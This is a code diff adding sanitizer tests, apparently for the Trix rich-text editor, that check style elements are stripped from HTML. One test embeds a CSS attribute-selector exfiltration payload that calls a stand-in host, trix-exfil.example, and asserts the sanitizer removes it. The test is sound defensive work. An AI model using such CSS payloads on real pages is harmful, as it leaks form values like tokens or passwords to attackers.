@@ -49,6 +49,24 @@ testGroup("HTMLSanitizer", () => {
     assert.notOk(body.querySelector("[onerror]"), body.innerHTML)
   })
 
+  test("strips a style element like a script element", () => {
+    const html = "<style>.x { color: red }</style><p>keep</p>"
+    const body = HTMLSanitizer.sanitize(html).getBody()
+
+    assert.notOk(body.querySelector("style"), body.innerHTML)
+    assert.ok(body.querySelector("p"), body.innerHTML)
+  })
+
+  test("strips a style element rendered inside attachment content, including an attribute-selector CSS exfiltration payload", () => {
+    const exfil = "input[value^=\"a\"] { background: url(https://trix-exfil.example/leak) }"
+    const html = `<figure data-trix-attachment='{"contentType":"text/html","content":"rendered"}'><style>${exfil}</style><p>attachment body</p></figure>`
+    const body = HTMLSanitizer.sanitize(html).getBody()
+
+    assert.ok(body.querySelector("figure"), "attachment element was dropped")
+    assert.notOk(body.querySelector("style"), body.innerHTML)
+    assert.notOk(body.innerHTML.includes("trix-exfil.example"), body.innerHTML)
+  })
+
   test("strips data-trix-serialized-attributes containing markup when sanitizing for XML", () => {
     const html = "<div data-trix-serialized-attributes='{\"a\":\"</style>\"}'>content</div>"
     const body = HTMLSanitizer.sanitize(html, { purifyOptions: { SAFE_FOR_XML: true } }).getBody()
